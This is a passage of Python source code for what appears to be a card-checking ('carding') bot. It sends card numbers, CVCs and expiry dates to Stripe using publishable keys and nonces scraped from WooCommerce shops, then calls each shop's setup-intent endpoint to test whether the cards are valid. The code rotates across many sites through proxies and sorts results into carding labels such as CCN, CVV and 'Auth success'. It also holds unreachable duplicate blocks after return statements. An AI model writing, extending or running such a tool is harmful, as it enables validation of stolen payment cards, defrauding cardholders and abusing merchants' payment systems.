            return {"status": "DECLINED", "reason": "Site Response Failed (missing PK/Nonce)"}


        # Stripe: create payment method
        # Stripe: create payment method
        stripe_data = {
            "type": "card",
            "card[number]": n,
            "card[cvc]": cvc,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "key": pk,
            "_stripe_version": "2024-06-20"
        }

        print("[DEBUG] Sending card data to Stripe API")
        stripe_json = {}
        stripe_id = None
        stripe_reason = None

        try:
            resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_data,
                headers=headers,
                timeout=10,
                verify=False
            )

            try:
                stripe_json = resp.json()
                print(f"[DEBUG] Stripe response: {stripe_json}")
            except Exception:
                print(f"[ERROR] Stripe invalid JSON: {resp.text[:500]}")
                stripe_reason = "Invalid Stripe JSON"
                stripe_json = {"error": {"message": stripe_reason}}
                resp = None

            if stripe_json.get("id"):
                stripe_id = stripe_json["id"]
                print(f"[RESULT] ✅ Stripe PaymentMethod Created: {stripe_id}")
            else:
                stripe_reason = stripe_json.get("error", {}).get("message", "Unknown Stripe error").lower()
                print(f"[RESULT] ❌ Declined from Stripe: {stripe_reason}")

                # 🔎 Handle common Stripe declines
                if any(k in stripe_reason for k in [
                    "incorrect_number", "invalid number", "your card number is incorrect"
                ]):
                    return {
                        "status": "DECLINED",
                        "reason": "Your card number is incorrect.",
                        "source": "stripe",
                        "stripe": stripe_json
                    }

                elif any(k in stripe_reason for k in [
                    "invalid_cvc", "incorrect_cvc", "invalid cvv", "incorrect cvv",
                    "invalid security", "cvc check fail", "security code incorrect"
                ]):
                    return {
                        "status": "DECLINED",
                        "reason": "Your card security code is incorrect.",
                        "source": "stripe",
                        "stripe": stripe_json
                    }

                elif "unsupported for publishable key tokenization" in stripe_reason or "tokenization" in stripe_reason:
                    return {
                        "status": "DECLINED",
                        "reason": "Stripe token error.",
                        "source": "stripe",
                        "stripe": stripe_json
                    }

                else:
                    # Normalize "not supported" messages from Stripe
                    stripe_msg = stripe_json.get('error', {}).get('message', 'Unknown Stripe error')
                    stripe_msg_lower = stripe_msg.lower()
                    if any(x in stripe_msg_lower for x in ["not supported", "does not support", "unsupported", "is not supported"]):
                        # "Not supported" should be treated as APPROVED (CVV), not DECLINED
                        return {
                            "status": "APPROVED",
                            "reason": "Your card does not support this type of purchase.",
                            "source": "stripe",
                            "stripe": stripe_json
                        }
                    else:
                        return {
                            "status": "DECLINED",
                            "reason": f"Stripe: {stripe_msg}",
                            "source": "stripe",
                            "stripe": stripe_json
                        }


        except Exception as e:
            print(f"[EXCEPTION] ⚠️ Stripe direct request failed: {e}")
            stripe_reason = f"Stripe request failed: {e}"

        # 🧩 If Stripe failed, stop early (no site request)
        if not stripe_id:
            # If Stripe fails due to API or connection issues → mark dead
            is_network_issue = (
                stripe_reason and any(x in stripe_reason.lower() for x in [
                    "request failed", "connection", "timeout", "ssl", "proxy", "site"
                ])
            )
            return {
                "status": "DECLINED",
                "reason": f"Stripe: {stripe_reason or 'Unknown error'}",
                "stripe": stripe_json,
                "site_dead": is_network_issue,
                "site_url": self.site_url,
            }



        # ================================================================
        # Continue to site checkout
        # ================================================================
        site_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": stripe_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }

        print("[DEBUG] Sending to site checkout...")
        final_resp = safe_request(
            session,
            "post",
            f"{self.site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=site_data,
            timeout=10,
        )

        # --- detect site not responding ---
        if not final_resp:
            print("[ERROR] Site did not respond or timed out.")
            # Only mark as dead if the issue looks like a true site failure
            return {
                "status": "DECLINED",
                "reason": "Site Response Failed (Timeout or No Response)",
                "site_dead": True,   # true dead site (no HTTP response at all)
                "site_url": self.site_url,
            }

        # ✅ FAST: Detect authentication failure and clear session cache
        if hasattr(final_resp, 'status_code') and final_resp.status_code in (401, 403):
            print("[DEBUG] Authentication failed (401/403) → clearing session cache for next card.")
            _clear_cached_session(self.chat_id, self.site_url, self.worker_id)


        try:
            site_json = final_resp.json()
            print(f"[DEBUG] Site response: {site_json}")
        except Exception as e:
            print(f"[ERROR] Site invalid JSON: {final_resp.text[:500]} ({e})")
            return {
                "status": "DECLINED",
                "reason": "Site invalid response",
                "site_dead": True,
                "site_url": self.site_url,
            }


        # ✅ Process site result
        # ✅ Process site result
        site_requires_action = False
        site_data = site_json.get("data")
        if isinstance(site_data, dict):
            status_value = str(site_data.get("status", "")).lower()
            next_action_type = str(site_data.get("next_action", {}).get("type", "")).lower() if isinstance(site_data.get("next_action"), dict) else ""
            site_requires_action = (
                status_value in ("requires_action", "requires authentication", "authentication_required")
                or "requires_action" in status_value
                or "requires_action" in next_action_type
                or "use_stripe_sdk" in next_action_type
            )
        elif isinstance(site_data, str):
            site_requires_action = "requires_action" in site_data.lower() or "requires action" in site_data.lower()

        if not site_requires_action:
            # check top-level messages for requires_action even if data missing
            site_json_str = json.dumps(site_json).lower()
            if "requires_action" in site_json_str or "requires action" in site_json_str:
                site_requires_action = True

        if site_json.get("success") and not site_requires_action:
            print("[RESULT] ✅ Card added successfully (Site).")
            status = "CARD ADDED"
            reason = "Auth success🔥"
        elif site_requires_action:
            print("[RESULT] ⚠️ Site requires additional authentication (3DS).")
            status = "3DS_REQUIRED"
            reason = "Requires 3DS authentication."
        else:
            err_msg = (
                site_json.get("data", {}).get("error", {}).get("message")
                or site_json.get("error", {}).get("message")
                or stripe_json.get("error", {}).get("message")
                or "Unknown Decline"
            ).lower()
            print(f"[RESULT] ❌ Decline reason: {err_msg}")

            if any(x in err_msg for x in ["security", "cvc", "cvv", "invalid cvc", "incorrect cvc", "security code"]):
                status, reason = "CCN", "Your card security is incorrect."
            elif any(x in err_msg for x in ["insufficient", "low balance", "not enough funds"]):
                status, reason = "INSUFFICIENT_FUNDS", "Insufficient funds."
            elif any(x in err_msg for x in ["does not support", "unsupported", "not supported"]):
                status, reason = "APPROVED", "Your card does not support this type of purchase."
            elif any(x in err_msg for x in ["expired", "expiration", "invalid expiry"]):
                status, reason = "DECLINED", "Card expired."
            elif any(x in err_msg for x in ["incorrect number", "your card is incorrect", "invalid number"]):
                status, reason = "DECLINED", "Your card number is incorrect."
            else:
                status, reason = "DECLINED", f"Card declined ({err_msg})"

        # ============================================================
        # 🧩 Normalize the result so mass/manual can interpret it
        # ============================================================
        normalized = normalize_result(status, reason)

        # Sync proxy flags before returning
        self._used_proxy = getattr(session, "_used_proxy", False)
        self._proxy_status = getattr(session, "_proxy_status", "Proxy None")

        final_result = {
            "status": normalized["status"],
            "top_status": normalized["top_status"],
            "display_status": normalized["display_status"],
            "message": normalized["message"],
            "reason": normalized["message"],
            "emoji": normalized["emoji"],
            "stripe": stripe_json,
            "site": site_json,
            "raw_reason": reason,
            "stripe_id": stripe_id,
        }

        print(f"[DEBUG] Final normalized result for {self.chat_id}: {final_result}")
        return final_result



        if not final_resp:
            print("[ERROR] Site did not respond or timed out.")
            # mark this as a true dead site, because site didn't respond at all
            return {
                "status": "DECLINED",
                "reason": "Site Response Failed (Timeout or No Response)",
                "site_dead": True,
                "site_url": self.site_url
            }


        try:
            site_json = final_resp.json()
            # ✅ Compact single-line output like Stripe
            print(f"[DEBUG] Site response: {site_json}")
        except Exception as e:
            print(f"[ERROR] Site invalid JSON: {final_resp.text[:500]} ({e})")
            site_json = {"success": False, "error": {"message": "Non-JSON response"}}

        # You can still safely return the same structure your mass/manual check uses
        return site_json


        # Process result
        if site_json.get("success"):
            status = "CARD ADDED"
            reason = "Auth success🔥"
            print("[RESULT] ✅ Card added successfully (Site).")
        else:
            err_msg = (
                site_json.get("data", {}).get("error", {}).get("message")
                or stripe_json.get("error", {}).get("message")
                or site_json.get("error", {}).get("message")
                or "Unknown Decline"
            ).lower()
            print(f"[RESULT] ❌ Decline reason: {err_msg}")

            if "security" in err_msg or "cvc" in err_msg or "cvv" in err_msg:
                status, reason = "CCN", "Your Card security code is incorrect"
            elif "insufficient" in err_msg:
                status, reason = "INSUFFICIENT_FUNDS", "Insufficient funds"
            elif "does not support" in err_msg or "unsupported" in err_msg:
                status, reason = "APPROVED", "Does not support purchase type"
            elif "incorrect" in err_msg:
                status, reason = "DECLINED", "Card number incorrect"
            elif "site_error" in err_msg or "no response" in err_msg:
                status, reason = "SITE_ERROR", "Site not responding"
            else:
                status, reason = "DECLINED", f"Card declined ({err_msg})"

        normalized = normalize_result(status, reason)
        # ✅ Sync proxy status from the actual session before returning
        self._used_proxy = getattr(session, "_used_proxy", False)
        self._proxy_status = getattr(session, "_proxy_status", "Proxy None")
        print(f"[DEBUG] Final proxy status for user {self.chat_id}: {self._proxy_status}")
                
        return {
            "status": normalized["status"],
            "top_status": normalized["top_status"],
            "display_status": normalized["display_status"],
            "message": normalized["message"],
            "emoji": normalized["emoji"],
            "stripe": stripe_json,
            "site": site_json,
            "raw_reason": reason,
        }



# ==========================================================
# RESULT NORMALIZER
# ==========================================================
def normalize_result(status_raw: str, err_msg: str = ""):
    status = (status_raw or "").upper().strip()
    err_lower = (err_msg or "").lower()

    if any(x in err_lower for x in ["requires_action", "requires action", "3ds", "authentication required"]):
        status = "3DS_REQUIRED"
    elif any(x in err_lower for x in ["insufficient", "low balance", "not enough funds"]):
        status = "INSUFFICIENT_FUNDS"
    elif any(x in err_lower for x in ["security", "cvc", "cvv", "invalid cvc", "incorrect cvc"]):
        status = "CCN"
    elif any(x in err_lower for x in ["does not support", "unsupported", "not supported"]):
        status = "APPROVED"
    elif any(x in err_lower for x in ["incorrect number", "card number is incorrect", "your card is incorrect", "invalid number"]):
        status = "DECLINED"
        err_msg = "Your card number is incorrect"
    elif any(x in err_lower for x in ["expired", "expiration", "invalid expiry"]):
        status = "DECLINED"
        err_msg = "Card expired"

    mapping = {
        "CARD ADDED": ("Approved ✅", "CARD ADDED", "Auth success🔥", "✅"),
        "APPROVED": ("Approved ✅", "APPROVED", err_msg or "Approved.", "✅"),
        "INSUFFICIENT_FUNDS": ("Insufficient Funds 💵", "INSUF_FUNDS", "Insufficient funds.", "💵"),
        "CCN": ("CCN 🔥", "CCN", "Your card security is incorrect.", "🔥"),
        "CVV": ("CVV ⚠️", "CVV", "Your card does not support this type of purchase.", "⚠️"),
        "3DS_REQUIRED": ("3DS ⚠️", "3DS_REQUIRED", "Requires 3DS authentication.", "⚠️"),
        "DECLINED": ("Declined ❌", "DECLINED", err_msg or "Card declined.", "❌"),
    }

    top, disp, msg, emoji = mapping.get(status, ("Declined ❌", "DECLINED", err_msg or "Card declined.", "❌"))
    return {
        "status": status,
        "top_status": top,
        "display_status": disp,
        "message": msg,
        "emoji": emoji,
    }




# ==========================================================
# PROCESS CARD FOR USER SITES (Auto-default site if missing)
# ==========================================================
def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None, preferred_site=None, stop_checker=None):
    from mass_check import is_stop_requested

    # 🛑 Stop check before anything starts
    chat_id = str(chat_id)

    def _should_stop() -> bool:
        if stop_checker:
            try:
                if stop_checker():
                    return True
            except Exception:
                pass
        return is_stop_requested(chat_id)

    if _should_stop():
        print(f"[PROCESS STOP] User {chat_id} requested stop before processing card.")
        return None, {"status": "STOPPED", "reason": "User requested stop"}

    state = _load_state(chat_id)
    user_sites = list(state.get(chat_id, {}).get("sites", {}).keys())

    # ✅ AUTO-ADD default site for new users (no sites.json entry)
    if not user_sites:
        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before auto-site setup.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        from runtime_config import get_default_site
        default_site = get_default_site()

        print(f"[AUTO-SITE] No sites for {chat_id}. Using default: {default_site}")
        manager = SiteAuthManager(default_site, chat_id, proxy)
        site_url = default_site
        result = manager.process_card(ccx)

        if isinstance(result, dict):
            result["_used_proxy"] = getattr(manager, "_used_proxy", False)
            try:
                if hasattr(manager, "_new_session"):
                    test_sess = manager._new_session()
                    result["_used_proxy"] = getattr(test_sess, "_used_proxy", result["_used_proxy"])
            except Exception:
                pass

        return site_url, result

    # If user has sites — get first and mode
    first_site = user_sites[0]
    mode = state[chat_id]["sites"][first_site].get("mode", "all").lower()

    # =======================================================
    # FORCE SPECIFIC SITE (for retry confirmations)
    # =======================================================
    if preferred_site:
        target_site = preferred_site
        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before forced site processing.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        manager = SiteAuthManager(target_site, chat_id, proxy, worker_id=worker_id)
        result = manager.process_card(ccx)

        if isinstance(result, dict):
            result["_used_proxy"] = getattr(manager, "_used_proxy", False)

        return manager.site_url, result

    # =======================================================
    # MODE: ROTATE  (random + round robin)
    # =======================================================
    if mode == "rotate":
        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before rotate mode processing.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        site_url = get_next_user_site(chat_id)
        print(f"[ROTATE] User {chat_id} → Randomly selected site: {site_url}")

        manager = SiteAuthManager(site_url, chat_id, proxy, worker_id=worker_id)
        result = manager.process_card(ccx)



        if isinstance(result, dict):
            # Keep proxy flag from the real session used inside process_card()
            result["_used_proxy"] = getattr(manager, "_used_proxy", False)


        return site_url, result

    # =======================================================
    # MODE: ALL
    # =======================================================
    elif mode == "all":
        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before all-sites loop.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        result = None
        for site_url in user_sites:
            if _should_stop():
                print(f"[PROCESS STOP] User {chat_id} stopped mid-loop (site={site_url}).")
                return None, {"status": "STOPPED", "reason": "User requested stop"}

            manager = SiteAuthManager(site_url, chat_id, proxy, worker_id=worker_id)
            result = manager.process_card(ccx)

            if _should_stop():
                print(f"[PROCESS STOP] User {chat_id} stopped after processing site {site_url}.")
                return None, {"status": "STOPPED", "reason": "User requested stop"}

            if result:
                status = result.get("status", "").upper()
                if status in [
                    "CARD ADDED", "PAYMENT_ADDED", "CCN", "INSUFFICIENT_FUNDS",
                    "APPROVED", "CVV", "3DS_REQUIRED", "DOES_NOT_SUPPORT", "UNSUPPORTED_GATEWAY"
                ]:
                    return site_url, result

        last_site = user_sites[-1] if user_sites else get_default_site()
        return last_site, result

    # =======================================================
    # Fallback
    # =======================================================
    else:
        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before fallback mode.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        from runtime_config import get_default_site
        site_url = get_default_site()
        manager = SiteAuthManager(site_url, chat_id, proxy, worker_id=worker_id)
        result = manager.process_card(ccx)

        if _should_stop():
            print(f"[PROCESS STOP] User {chat_id} stopped before returning fallback result.")
            return None, {"status": "STOPPED", "reason": "User requested stop"}

        return site_url, result
def clone_user_site_files(chat_id, workers=5):
    """
    Clone base site JSON into per-worker copies under sites/<chat_id>/.
    Used when user replaces sites or resets default.
    """
    chat_id = str(chat_id)
    base = _get_user_site_file(chat_id)
    if not os.path.exists(base):
        ensure_user_site_exists(chat_id)

    user_dir = os.path.join("sites", chat_id)
    os.makedirs(user_dir, exist_ok=True)

    for i in range(1, workers + 1):
        target = os.path.join(user_dir, f"sites_{chat_id}_{i}.json")
        try:
            shutil.copy(base, target)
            print(f"[SITE CLONE] Created {target}")
        except Exception as e:
            print(f"[SITE CLONE ERROR] {chat_id}: {e}")


def reset_user_sites(chat_id):
    """
    Deletes the user's current site JSON (inside /sites/<chat_id>/)
    and recreates it fresh with all default sites from runtime_config.
    This is used when the user requests a reset or when site files are missing.
    """
    from runtime_config import get_all_default_sites

    chat_id = str(chat_id)
    user_dir = os.path.join("sites", chat_id)
    os.makedirs(user_dir, exist_ok=True)

    path = os.path.join(user_dir, f"sites_{chat_id}.json")

    # 🧹 Delete old files (both base and worker copies)
    try:
        if os.path.exists(path):
            os.remove(path)
        for f in os.listdir(user_dir):
            if f.startswith(f"sites_{chat_id}_") and f.endswith(".json"):
                os.remove(os.path.join(user_dir, f))
        print(f"[SITE RESET] Removed old site files for {chat_id}")
    except Exception as e:
        print(f"[SITE RESET ERROR] Failed to clean up old files for {chat_id}: {e}")

    # 🧩 Create a new default file
    default_sites = get_all_default_sites()
    default_state = {chat_id: {"sites": {}}}

    for site in default_sites:
        default_state[chat_id]["sites"][site] = {
            "accounts": [],
            "cookies": None,
            "payment_count": 0,
            "mode": "rotate",
        }

    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default_state, f, indent=2)
        print(f"[SITE RESET] Created fresh site file for {chat_id}")

        # 🔁 Recreate worker clones
        from config import MAX_WORKERS
        clone_user_site_files(chat_id, MAX_WORKERS)

    except Exception as e:
        print(f"[SITE RESET ERROR] Could not recreate site JSON for {chat_id}: {e}")






